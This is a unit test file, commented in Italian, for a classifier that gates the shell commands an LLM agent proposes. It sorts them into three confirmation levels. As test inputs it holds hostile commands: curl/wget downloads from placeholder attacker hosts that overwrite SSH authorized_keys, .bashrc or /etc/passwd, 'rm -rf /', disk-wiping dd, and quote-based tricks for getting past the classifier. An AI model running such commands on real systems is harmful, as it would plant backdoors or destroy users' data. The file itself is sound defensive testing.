// Unit test per src/shared/cmdClassify.js — il classificatore comando→livello
// di sicurezza (#146.6). La classificazione DEVE avvenire sul comando effettivo
// (mai fidarsi dell'LLM): qui copriamo molte combinazioni perché è il punto
// dove un errore = un comando pericoloso eseguito con troppa poca frizione.
//
// Mappa livelli: 1 = sola lettura (esegue subito) · 2 = recuperabile (popup) ·
// 3 = cancellazioni / pericolosi / non riconosciuti / concatenati ("conferma").

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const require = createRequire(import.meta.url);
const __dirname = dirname(fileURLToPath(import.meta.url));
require(join(__dirname, '..', '..', 'src', 'shared', 'cmdClassify.js'));

const C = globalThis.SN_CMD_CLASSIFY;
const lvl = (cmd) => C.classify(cmd);

test('il modulo si registra su globalThis con la sua API', () => {
  assert.ok(C);
  assert.equal(typeof C.classify, 'function');
});

test('livello 1 — comandi di sola lettura in whitelist eseguono subito', () => {
  for (const cmd of [
    'ls', 'ls -la', 'dir', 'pwd', 'cat package.json', 'type file.txt',
    'echo ciao', 'whoami', 'hostname', 'date', 'head -n 20 log.txt',
    'tail -f out.log', 'tree', 'wc -l file', 'grep foo file', 'findstr foo file',
    'where node', 'which git',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

test('livello 1 — git e npm di sola lettura', () => {
  for (const cmd of [
    'git status', 'git log', 'git log --oneline -10', 'git diff', 'git diff HEAD~1',
    'git show', 'git branch', 'git remote -v', 'git config --get user.name',
    'npm list', 'npm ls', 'npm --version', 'npm view react', 'npm outdated',
    'pip list', 'git', 'npm',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

test('livello 2 — modifiche recuperabili chiedono conferma (popup)', () => {
  for (const cmd of [
    'git push', 'git push origin main', 'git commit -m "x"', 'git add .',
    'git pull', 'git fetch', 'git checkout main', 'git merge dev',
    'npm install', 'npm i', 'npm ci', 'npm install lodash', 'npm uninstall lodash',
    'npm update', 'mkdir build', 'md build', 'touch nuovo.txt',
    'cp a.txt b.txt', 'copy a b', 'mv a.txt b.txt', 'move a b',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" dovrebbe essere livello 2`);
  }
});

test('livello 3 — cancellazioni richiedono di digitare "conferma"', () => {
  for (const cmd of [
    'rm file', 'rm -rf node_modules', 'rmdir build', 'rd /s build',
    'del file.txt', 'erase file', 'unlink file', 'shred segreto',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" dovrebbe essere livello 3`);
  }
});

test('livello 3 — comando inventato / non riconosciuto è livello 3 di default', () => {
  for (const cmd of ['foobar', 'pippo --pluto', 'qualcosadiinventato x y', './configure', './script.sh', 'whatevs']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (non standard) dovrebbe essere livello 3`);
  }
});

test('livello 3 — concatenazioni e redirezioni (non interamente riconoscibili)', () => {
  for (const cmd of [
    'ls && rm -rf x',          // && con un comando di per sé livello 1
    'git status; rm file',     // ;
    'cat file | rm x',         // | pipe con un pezzo distruttivo
    'echo ciao > file.txt',    // > redirezione
    'echo ciao >> file.txt',   // >>
    'cat < input.txt',         // < redirezione
    'echo `whoami`',           // backtick
    'echo $(whoami)',          // $()
    'ls & dir',                // & background/call
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" con metacaratteri dovrebbe essere livello 3`);
  }
});

test('sequenza sicura — letture concatenate con && / ; / || restano livello 1', () => {
  // Il caso del feedback #201: `cd Desktop && ls` sono due letture, concatenarle
  // non deve farle salire a livello 3 ("conferma" per un'azione irreversibile).
  for (const cmd of [
    'cd Desktop && ls',
    'cd Desktop&&ls',
    'cd .. && pwd && ls -la',
    'ls; pwd',
    'cat a.txt || echo vuoto',
    'cd C:\\Users && dir',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (sequenza di sole letture) dovrebbe essere livello 1`);
  }
});

test('sequenza — il livello è il MASSIMO dei pezzi', () => {
  assert.equal(lvl('cd build && mkdir out'), 2, 'cd(1) && mkdir(2) → 2');
  assert.equal(lvl('git status && git push'), 2, 'lettura(1) && push(2) → 2');
  assert.equal(lvl('cd x && rm -rf y'), 3, 'cd(1) && rm(3) → 3');
  assert.equal(lvl('ls && foobar'), 3, 'ls(1) && sconosciuto(3) → 3');
  assert.equal(lvl('cd x && node app.js'), 3, 'cd(1) && interprete(3) → 3');
});

test('mescolare sequenza e pipe NON è sicuro → resta 3', () => {
  // Una pipeline di sole letture scende a 1 (vedi più sotto), ma MESCOLARLA con
  // `&&`/`;`/`&`/redirezioni no: il comando non è più interamente riconoscibile.
  for (const cmd of [
    'cat a && ls | cat', // pipe dentro una sequenza
    'ls | cat && rm x',  // sequenza dentro una pipe
    'ls & pwd',          // background
    'cd x && ls > out',  // redirezione
    'cd x && echo $(pwd)',
    'ls | cat > out.txt',// pipe che finisce in una redirezione
    'ls || cat',         // || non è una pipe
    'ls |',              // pipe monca
    '| ls',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" non è riconoscibile per intero → livello 3`);
  }
});

test('livello 3 — flag pericolosi alzano un comando altrimenti ≤2', () => {
  assert.equal(lvl('git reset --hard'), 3);
  assert.equal(lvl('git clean -fd'), 3);
  assert.equal(lvl('git push --force'), 3);
  assert.equal(lvl('git checkout --force main'), 3);
  assert.equal(lvl('git branch -D feature'), 3); // -D = force delete
});

test('git checkout/stash distruttivi (scartano lavoro non salvato) → livello 3', () => {
  // Feedback #390: le forme di checkout/stash che buttano via modifiche non
  // salvate devono chiedere di digitare "conferma" (3), come restore/reset --hard.
  for (const cmd of [
    'git checkout .',                 // scarta TUTTE le modifiche del working tree
    'git checkout -- file.txt',       // scarta un file specifico
    'git checkout -- .',              // separatore + tutto
    'git checkout HEAD -- src',       // ripristina path da un ref
    'git checkout HEAD file.txt',     // <ref> <path> senza `--`
    'git checkout main src/app.js',   // <ref> <path>
    'git checkout --discard-changes', // butta via le modifiche (anche per switch)
    'git switch --discard-changes main',
    'git stash drop',                 // elimina uno stash salvato
    'git stash drop stash@{1}',
    'git stash clear',                // elimina TUTTI gli stash
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (scarta lavoro non salvato) dovrebbe essere livello 3`);
  }
});

test('git checkout/stash NON distruttivi restano livello 2 (solo conferma OK)', () => {
  // La discriminante è il pathspec: cambio/creazione ramo e salvataggio stash
  // non buttano via nulla di irreversibile → non devono chiedere di digitare
  // "conferma", solo un OK.
  for (const cmd of [
    'git checkout main',              // cambio ramo
    'git checkout -b nuovo',          // crea ramo
    'git checkout -b nuovo origin/main', // crea ramo da start-point (2 operandi ma -b)
    'git checkout -B forza',          // ricrea ramo
    'git checkout -',                 // torna al ramo precedente
    'git stash',                      // salva le modifiche (recuperabile con pop)
    'git stash push -m wip',
    'git stash pop',                  // riapplica (recuperabile)
    'git stash apply',
    'git stash list',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (non distruttivo) dovrebbe essere livello 2`);
  }
});

test('git checkout/stash: le virgolette non abbassano il livello (bypass #390)', () => {
  // Feedback #390, secondo giro: la conferma forte si aggirava riscrivendo lo
  // STESSO comando distruttivo con virgolette che la shell (bash/cmd/powershell)
  // rimuove comunque — attorno al bersaglio, vuote prima/dopo, perfino in mezzo
  // alla parola. Il comando eseguito è identico, quindi il livello deve esserlo.
  for (const cmd of [
    'git checkout "."', "git checkout '.'",         // punto tra virgolette
    'git checkout .""', "git checkout .''",         // virgolette vuote DOPO
    'git checkout "".', "git checkout ''.",         // virgolette vuote PRIMA
    'git checkout "" .',                            // token vuoto separato
    'git "checkout" .', 'git checkout "--" file.txt',
    'git stash "drop"', "git stash 'clear'",
    "git stash drop''", "git stash ''clear", "git stash d''rop",
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" fa lo stesso danno della forma nuda → livello 3`);
  }
  // …e non alza quelle innocue scritte con le stesse virgolette.
  for (const cmd of ['git checkout "main"', "git checkout 'main'", 'git stash "pop"', 'git "checkout" -b nuovo']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" resta non distruttivo → livello 2`);
  }
});

test('git checkout: pathspec scritti in altre forme (barra, backslash, glob, estensione)', () => {
  // Tutte forme che git risolve come PERCORSI: `git checkout <percorso>` scarta
  // le modifiche non salvate di quei file esattamente come `git restore`.
  for (const cmd of [
    'git checkout ./',              // cartella corrente con la barra
    'git checkout .\\',             // idem in stile Windows
    'git checkout .\\src',          // percorso relativo Windows
    'git checkout ../',             // cartella superiore
    'git checkout \\.',             // punto con escape (bash)
    'git checkout src/',            // cartella
    'git checkout src/app.js',      // file con estensione
    'git checkout README.md',
    'git checkout "*.js"',          // glob
    'git checkout /home/user/x.txt',// percorso assoluto
    'git stash d\\rop',             // verbo con escape (bash)
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" prende di mira dei file → livello 3`);
  }
  // I nomi di ramo che ASSOMIGLIANO a percorsi restano livello 2: non buttano
  // via nulla e chiedere "conferma" a ogni cambio ramo sarebbe solo attrito.
  for (const cmd of ['git checkout origin/main', 'git checkout feature/login', 'git checkout v1.0', 'git checkout release-2']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" è un cambio ramo → livello 2`);
  }
});

test('git checkout: flag che prendono di mira i file → livello 3', () => {
  // Verificato eseguendoli davvero in un repo con modifiche non salvate:
  // `--pathspec-from-file` legge l'elenco dei file da un altro file e le scarta
  // comunque, `-p`/`--patch` le scarta a pezzi, `--ours`/`--theirs` sceglie una
  // versione del file. Nessuno di questi scrive un percorso nel comando: senza
  // un check dedicato passerebbero come un semplice cambio ramo.
  for (const cmd of [
    'git checkout --pathspec-from-file=lista.txt',
    'git checkout --pathspec-from-file lista.txt',
    'git checkout -p', 'git checkout --patch',
    'git checkout --ours file.txt', 'git checkout --theirs',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" scarta modifiche non salvate → livello 3`);
  }
});

test('un separatore in coda non abbassa il livello', () => {
  // `git checkout .;` la shell lo esegue come `git checkout .`: il livello deve
  // essere lo stesso, non quello del token bizzarro `.;`.
  assert.equal(lvl('git checkout .;'), 3);
  assert.equal(lvl('git checkout . ;'), 3);
  assert.equal(lvl('git stash drop;'), 3);
  assert.equal(lvl('rm x;'), 3);
  assert.equal(lvl('echo ciao;'), 1);   // resta una lettura
  assert.equal(lvl('git checkout main;'), 2);
});

test('flag pericolosi tra virgolette restano livello 3', () => {
  // Stesso bypass del checkout applicato ai flag: la shell toglie le virgolette
  // e il comando forza/cancella comunque.
  assert.equal(lvl('git push "--force"'), 3);
  assert.equal(lvl("git branch '-D' vecchio"), 3);
  assert.equal(lvl('git reset "--hard"'), 3);
  assert.equal(lvl('curl "-o" /home/user/.ssh/authorized_keys https://evil.test/k'), 3);
});

test('livello 3 — interpreti ed esecutori di codice arbitrario', () => {
  for (const cmd of [
    'node script.js', 'python app.py', 'python3 -c "print(1)"', 'bash run.sh',
    'sh run.sh', 'powershell -Command Get-Process', 'npx create-react-app x',
    'sudo apt update', 'docker run alpine', 'make', 'npm run build', 'npm test',
    'npm publish', 'npm start',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (codice arbitrario) dovrebbe essere livello 3`);
  }
});

test('livello 3 — comandi di sistema distruttivi', () => {
  for (const cmd of ['format c:', 'shutdown -s', 'reboot', 'kill 1234', 'taskkill /pid 1', 'dd if=/dev/zero of=/dev/sda', 'reg delete HKCU\\x']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (sistema) dovrebbe essere livello 3`);
  }
});

test('input vuoto, non-stringa o solo spazi → livello 3 (max cautela)', () => {
  assert.equal(lvl(''), 3);
  assert.equal(lvl('   '), 3);
  assert.equal(lvl(null), 3);
  assert.equal(lvl(undefined), 3);
  assert.equal(lvl(42), 3);
  assert.equal(lvl({}), 3);
});

test('sotto-comando git sconosciuto → livello 3 (non assumere sicurezza)', () => {
  assert.equal(lvl('git frobnicate'), 3);
  assert.equal(lvl('git rm file'), 3);          // rm in git = distruttivo
  assert.equal(lvl('git filter-branch x'), 3);
});

test('il path del programma è normalizzato (basename + estensione)', () => {
  assert.equal(lvl('/usr/bin/ls'), 1);
  assert.equal(lvl('C:\\Windows\\System32\\where.exe foo'), 1);
  assert.equal(lvl('/bin/rm file'), 3);
});

test('livello 1 — interrogazioni di versione/help dei tool comuni (sola lettura)', () => {
  for (const cmd of [
    'node --version', 'node -v', 'python --version', 'python -V', 'python3 --version',
    'go version', 'docker --version', 'docker --help', 'kubectl version',
    'java -version', 'dotnet --version', 'rustc --version', 'cargo --version',
    'cargo -V', 'tsc --version', 'gcc --version', 'ruby -v', 'php --version',
    'deno --version', 'npx --version', 'mvn --version', 'gradle --version',
    // anche i tool LEVEL2 ridotti a --version/--help sono lettura
    'curl --version', 'tar --version', 'mkdir --help', 'wget --version',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (versione/help) dovrebbe essere livello 1`);
  }
});

test('livello 3 — gli stessi interpreti restano 3 quando eseguono codice', () => {
  for (const cmd of [
    'node', 'node app.js', 'python -c "print(1)"', 'go run main.go', 'go build',
    'docker run alpine', 'docker ps', 'cargo build', 'npx create-react-app x',
    'java -jar app.jar', 'make all', 'code .',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (esecuzione) dovrebbe restare livello 3`);
  }
});

test('le shell dirette restano sempre 3, anche con flag di versione', () => {
  // `bash` da solo apre una sessione interattiva; nessuna eccezione versione.
  assert.equal(lvl('bash'), 3);
  assert.equal(lvl('bash --version'), 3);
  assert.equal(lvl('powershell -Command Get-Process'), 3);
  assert.equal(lvl('sh'), 3);
});

test('livello 1 — comandi di diagnostica di sola lettura aggiunti', () => {
  for (const cmd of ['ps', 'ps aux', 'free -h', 'lscpu', 'lsblk', 'printenv PATH', 'whereis node', 'who', 'sha256sum file']) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

test('livello 1 — date/hostname senza argomenti mutanti restano lettura', () => {
  for (const cmd of [
    'date', 'date +%Y-%m-%d', 'date -u', 'date -R', 'date -d "yesterday"',
    'date --date=@1700000000', 'date +%s',
    'hostname', 'hostname -f', 'hostname -I', 'hostname -i', 'hostname -d',
    'hostname -s', 'hostname -A',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (lettura) dovrebbe essere livello 1`);
  }
});

test('livello 2 — date -s / hostname <nome> modificano lo stato → conferma', () => {
  // Feedback #311: comandi che cambiano orologio o nome host venivano eseguiti
  // subito perché trattati come sola lettura; ora chiedono conferma.
  for (const cmd of [
    'date -s "2020-01-01 00:00:00"', 'date --set="2020-01-01 00:00:00"',
    'date --set 2020-01-01', 'date -s 010100002020',
    'hostname nuovonome', 'hostname test', 'hostname -F /etc/hostname',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (modifica stato) dovrebbe essere livello 2`);
  }
});

test('sequenza — date -s dentro una catena alza il livello a 2', () => {
  assert.equal(lvl('cd /tmp && date -s "2020-01-01 00:00:00"'), 2);
  assert.equal(lvl('hostname evil && ls'), 2);
});

test('livello 2 — git tag/branch con un nome CREANO (feedback #285) → conferma', () => {
  // Feedback #285: `git tag v1.0` e `git branch nuovo-branch` modificano la repo
  // (creano tag/branch) ma partivano subito, come una lettura. Ora chiedono
  // conferma perché hanno un operando dopo il sotto-comando.
  for (const cmd of [
    'git tag v1.0', 'git tag release-2', 'git tag -a v1.0 -m "rilascio"',
    'git branch nuovo-branch', 'git branch feature/x', 'git branch -m vecchio nuovo',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (crea/rinomina) dovrebbe essere livello 2`);
  }
});

test('livello 1 — git tag/branch NUDI o con soli flag di lettura ELENCANO', () => {
  // La forma senza operando è pura lettura (elenca): resta livello 1.
  for (const cmd of [
    'git tag', 'git tag -l', 'git tag --list',
    'git branch', 'git branch -a', 'git branch -r', 'git branch -v',
    'git branch --list', 'git branch --show-current',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (elenca) dovrebbe essere livello 1`);
  }
});

test('livello 3 — git tag -d / branch -D (cancellazioni) restano conferma-testo', () => {
  for (const cmd of ['git tag -d v1.0', 'git branch -d feature', 'git branch -D feature']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (cancella) dovrebbe essere livello 3`);
  }
});

test('git config — legge (1), imposta (2), cancella (3) secondo gli argomenti', () => {
  for (const cmd of ['git config --list', 'git config -l', 'git config --get user.name', 'git config user.name']) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (legge) dovrebbe essere livello 1`);
  }
  for (const cmd of ['git config user.name "Mario"', 'git config --global user.email a@b.c', 'git config --add safe.directory /x', 'git config --replace-all k v']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (imposta) dovrebbe essere livello 2`);
  }
  for (const cmd of ['git config --unset user.name', 'git config --unset-all k', 'git config --remove-section branch.x']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (cancella) dovrebbe essere livello 3`);
  }
});

test('git remote — elenca/mostra (1), aggiunge/rinomina (2), rimuove (3)', () => {
  for (const cmd of ['git remote', 'git remote -v', 'git remote show origin', 'git remote get-url origin']) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (legge) dovrebbe essere livello 1`);
  }
  for (const cmd of ['git remote add origin http://x/y.git', 'git remote rename origin upstream', 'git remote set-url origin http://z']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (modifica) dovrebbe essere livello 2`);
  }
  for (const cmd of ['git remote remove origin', 'git remote rm origin', 'git remote prune origin']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (rimuove) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl/wget che scrivono un file di output a un percorso arbitrario', () => {
  // Feedback sicurezza: `curl -o <path>` / `wget -O <path>` possono SOVRASCRIVERE
  // qualsiasi file (chiavi SSH, script d'avvio della shell) → devono chiedere di
  // digitare "conferma" (livello 3), non il semplice OK/Annulla (livello 2).
  for (const cmd of [
    'curl -o /home/user/.ssh/authorized_keys http://evil/x',
    'wget -O ~/.bashrc http://evil/x',
    'curl -O http://evil/x',                 // -O usa il basename dell'URL come nome file
    'curl -sLo out.sh http://evil/x',        // -o dentro un bundle di short-flag
    'curl -fsSLo /etc/profile.d/x.sh http://x',
    'wget --output-document=/etc/passwd http://x',
    'curl --output /root/.ssh/id_rsa http://x',
    'curl --remote-name http://x',
    'curl -o file.txt http://x',
    'wget -o wget.log http://x',             // wget -o = file di log, scrive comunque un file
    'wget --output-document /x http://y',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (scrive un file di output) dovrebbe essere livello 3`);
  }
});

test('livello 3 — wget che sceglie la CARTELLA di destinazione (-P/--directory-prefix)', () => {
  // Verifier: `wget -P ~/.ssh http://evil/authorized_keys` scarica contenuto
  // interamente scelto dall'attaccante (nome file dall'URL) dritto in una dir
  // sensibile → stessa backdoor di -O, deve chiedere di digitare "conferma".
  for (const cmd of [
    'wget -P ~/.ssh http://esempio/authorized_keys',
    'wget -P /home/utente/.ssh http://evil/authorized_keys',
    'wget --directory-prefix=/home/utente/.ssh http://evil/authorized_keys',
    'wget --directory-prefix /root/.ssh http://x',
    'wget -P/tmp/boot http://x',               // -P attaccato al valore
    'wget -rP /home/u/.ssh http://x',          // -P dentro un bundle di short-flag
    'wget -e robots=off -P /root/.ssh http://x',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (wget sceglie la cartella) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl che scrive gli header su un file arbitrario (-D/--dump-header)', () => {
  for (const cmd of [
    'curl -D /home/user/.ssh/authorized_keys http://evil/x',
    'curl --dump-header /root/.bashrc http://x',
    'curl -sD /etc/profile http://x',          // -D dentro un bundle di short-flag
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (dump header su file) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl che salva DATI ACCESSORI influenzati dal server su un file scelto', () => {
  // #332: cookie-jar, etag-save, trace/trace-ascii, stderr scrivono in un
  // percorso arbitrario contenuto deciso/influenzato dal remoto → digita "conferma".
  for (const cmd of [
    'curl -c /home/user/.ssh/authorized_keys http://evil/x',   // cookie-jar (short)
    'curl --cookie-jar /root/.bashrc http://x',
    'curl --cookie-jar=/root/.bashrc http://x',
    'curl -sc /root/.profile http://x',                        // -c dentro un bundle
    'curl -cs /root/.profile http://x',                        // -c a inizio bundle
    'curl --etag-save ~/.ssh/authorized_keys http://x',
    'curl --trace /root/.bashrc http://x',
    'curl --trace-ascii /root/.bashrc http://x',
    'curl --stderr /root/.bashrc http://x',
    'wget --save-cookies /root/.ssh/authorized_keys http://x', // simmetria wget
    'wget --save-cookies=/root/.bashrc http://x',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (dati accessori su file scelto) dovrebbe essere livello 3`);
  }
});

test('livello 2 — i flag curl/wget di LETTURA simili ai write accessori restano 2', () => {
  // Non devono salire a 3: -C/--continue-at (riprende un download normale),
  // --cookie/-b e --load-cookies (LEGGONO i cookie), --etag-compare, --cacert/
  // --cert (leggono un certificato), --trace-time/--trace-ids (modificatori).
  for (const cmd of [
    'curl -C 0 http://x',                        // -C maiuscolo (resume): non è cookie-jar
    'curl --continue-at 100 http://x',
    'curl -b cookies.txt http://x',              // -b = legge i cookie
    'curl --cookie cookies.txt http://x',
    'curl --cacert /etc/ca.pem http://x',        // legge un CA cert
    'curl --cert client.pem http://x',
    'curl --compressed http://x',
    'curl --connect-timeout 5 http://x',
    'curl --etag-compare etag.txt http://x',     // confronta l'ETag (legge)
    'wget --load-cookies cookies.txt http://x',  // legge i cookie
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (flag di lettura) dovrebbe restare livello 2`);
  }
});

test('livello 2 — curl/wget SENZA flag di output restano conferma-popup', () => {
  // curl senza -o stampa su stdout; wget nudo scrive al più nella cwd col nome
  // dell'URL: modifica recuperabile → livello 2 (nessuna regressione). I flag
  // comuni non di output (-s, -I, -L, -H, -X, -k, -j, -u…) non devono salire a 3.
  // In particolare: la P/D minuscole e i flag simili NON devono far scattare i
  // check nuovi (wget -p = --page-requisites, wget -np = --no-parent,
  // curl -d = corpo POST, curl --data-*).
  for (const cmd of [
    'curl http://example.com', 'wget http://example.com/file',
    'curl -s http://x', 'curl -I http://x', 'curl -L http://x',
    'curl -X POST http://x', 'curl -k http://x', 'curl -j http://x',
    'curl -u user:pass http://x',
    'curl -d name=mario http://x',             // -d minuscolo = corpo POST, non dump
    'curl --data-binary @file http://x',
    'curl -d @payload.json http://x',
    'wget -p http://x',                        // -p minuscolo = --page-requisites (cwd)
    'wget -np -r http://x/dir/',               // -np = --no-parent, nessuna dir arbitraria
    'wget --no-parent http://x',
    'wget --prefer-family=IPv4 http://x',      // contiene "prefer" ma non è directory-prefix
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (nessun output-su-file) dovrebbe restare livello 2`);
  }
});

test('il check output è curl/wget-specifico — tar -O (estrai su stdout) resta 2', () => {
  // -O ha significati diversi per programmi diversi: per tar è "estrai su
  // stdout" (nessuna scrittura arbitraria), quindi NON deve salire a 3.
  assert.equal(lvl('tar -xOf archivio.tar'), 2, 'tar -O = stdout, resta livello 2');
});

test('sequenza — curl -o dentro una catena alza il livello a 3', () => {
  assert.equal(lvl('cd /tmp && curl -o /home/u/.ssh/authorized_keys http://evil/x'), 3);
  assert.equal(lvl('mkdir x && wget -O ~/.bashrc http://evil/x'), 3);
});

test('livello 3 — robocopy con flag distruttivi Windows (/MIR, /PURGE, /MOVE)', () => {
  // Feedback #270: `robocopy SRC DST /MIR` e `/PURGE` cancellano in modo
  // PERMANENTE (bypassando il Cestino) i file della destinazione non presenti
  // nella sorgente — un rm -rf mirato. DANGEROUS_FLAG_RE vedeva solo i flag
  // stile Unix (--force, -rf): questi slash-flag restavano a livello 2 (basta
  // un clic). Ora chiedono di digitare "conferma" (3). /MOVE e /MOV cancellano
  // la sorgente dopo la copia → stessa classe distruttiva.
  for (const cmd of [
    'robocopy C:\\src C:\\dst /MIR',
    'robocopy C:\\src C:\\dst /PURGE',
    'robocopy C:\\origine C:\\destinazione /E /PURGE',
    'robocopy src dst /mir',            // case-insensitive (i flag Windows lo sono)
    'robocopy C:\\a C:\\b /MOVE',
    'robocopy C:\\a C:\\b /MOV',
    'robocopy C:\\a C:\\b /E /MIR /R:3', // in mezzo ad altri flag
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (robocopy distruttivo) dovrebbe essere livello 3`);
  }
});

test('livello 2 — robocopy SENZA flag distruttivi resta conferma-popup', () => {
  // Nessuna regressione: una copia robocopy normale (anche con flag innocui) è
  // una modifica recuperabile → resta livello 2, non deve salire a 3.
  for (const cmd of [
    'robocopy C:\\src C:\\dst',
    'robocopy C:\\src C:\\dst /E',
    'robocopy C:\\src C:\\dst *.txt /S',
    'robocopy C:\\src C:\\dst /COPYALL /R:5 /W:2',
    'robocopy C:\\src C:\\dst /MT:8',   // /MT (multi-thread) non è distruttivo
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (copia robocopy normale) dovrebbe restare livello 2`);
  }
});

test('sequenza — robocopy /MIR dentro una catena alza il livello a 3', () => {
  assert.equal(lvl('cd C:\\work && robocopy C:\\src C:\\dst /MIR'), 3);
});

test('"criterio di fatto" della spec — gli esempi citati', () => {
  assert.equal(lvl('ls'), 1, 'ls esegue subito');
  assert.equal(lvl('git push'), 2, 'git push → popup');
  assert.equal(lvl('rm qualcosa'), 3, 'rm → digita conferma');
  assert.equal(lvl('comandoinventato'), 3, 'comando inventato → digita conferma');
  assert.equal(lvl('ls && rm -rf /'), 3, '&& → livello 3');
});
